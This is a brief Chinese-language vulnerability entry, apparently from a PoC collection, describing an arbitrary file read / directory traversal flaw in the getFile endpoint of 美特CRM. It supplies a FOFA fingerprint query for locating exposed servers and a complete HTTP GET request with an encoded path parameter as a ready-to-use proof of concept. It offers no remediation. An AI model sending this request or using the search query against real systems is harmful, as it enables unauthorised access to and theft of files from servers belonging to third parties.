## 美特CRM getFile 任意文件读取漏洞

## 漏洞描述
美特CRM `getFile` 接口存在目录穿越/任意文件读取问题，攻击者可以直接下载服务器任意文件，导致敏感信息泄露。

## 网络空间测绘
```
fofa: body="/common/scripts/basic.js"
```

## POC
```
GET /getFile?p=b998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6 HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

## 参考
- 社区情报

